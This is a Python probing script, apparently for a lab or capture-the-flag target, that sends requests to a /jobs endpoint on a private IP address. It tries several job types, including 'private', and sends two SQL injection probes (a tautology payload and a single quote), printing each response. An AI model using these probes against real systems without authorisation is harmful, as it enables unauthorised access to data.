import requests
import json

BASE_URL = "http://10.0.162.112:80"

def print_response(label, response):
    print(f"\n{'='*60}")
    print(f"[{label}]")
    print(f"{'='*60}")
    print(f"Status Code: {response.status_code}")
    print(f"Headers:")
    for key, value in response.headers.items():
        print(f"  {key}: {value}")
    print(f"Body:")
    try:
        print(json.dumps(response.json(), indent=2, ensure_ascii=False))
    except Exception:
        print(response.text)

def main():
    session = requests.Session()
    session.headers.update({
        "Content-Type": "application/json"
    })

    # 1. POST /jobs with {"job_type": "back-end"}
    try:
        r = session.post(f"{BASE_URL}/jobs", json={"job_type": "back-end"})
        print_response("1. POST /jobs {job_type: back-end}", r)
    except Exception as e:
        print(f"[1] Error: {e}")

    # 2. POST /jobs with {"job_type": "private"}
    try:
        r = session.post(f"{BASE_URL}/jobs", json={"job_type": "private"})
        print_response("2. POST /jobs {job_type: private}", r)
    except Exception as e:
        print(f"[2] Error: {e}")

    # 3. POST /jobs with {"job_type": "front-end"}
    try:
        r = session.post(f"{BASE_URL}/jobs", json={"job_type": "front-end"})
        print_response("3. POST /jobs {job_type: front-end}", r)
    except Exception as e:
        print(f"[3] Error: {e}")

    # 4. POST /jobs with no body (empty)
    try:
        r = session.post(f"{BASE_URL}/jobs", data="")
        print_response("4. POST /jobs (no body)", r)
    except Exception as e:
        print(f"[4] Error: {e}")

    # 5. GET /jobs
    try:
        r = session.get(f"{BASE_URL}/jobs")
        print_response("5. GET /jobs", r)
    except Exception as e:
        print(f"[5] Error: {e}")

    # 6. POST /jobs with SQL injection {"job_type": "back-end' OR '1'='1"}
    try:
        r = session.post(f"{BASE_URL}/jobs", json={"job_type": "back-end' OR '1'='1"})
        print_response("6. POST /jobs {job_type: back-end' OR '1'='1} (SQLi)", r)
    except Exception as e:
        print(f"[6] Error: {e}")

    # 7. POST /jobs with single quote {"job_type": "back-end'"}
    try:
        r = session.post(f"{BASE_URL}/jobs", json={"job_type": "back-end'"})
        print_response("7. POST /jobs {job_type: back-end'} (single quote)", r)
    except Exception as e:
        print(f"[7] Error: {e}")

if __name__ == "__main__":
    main()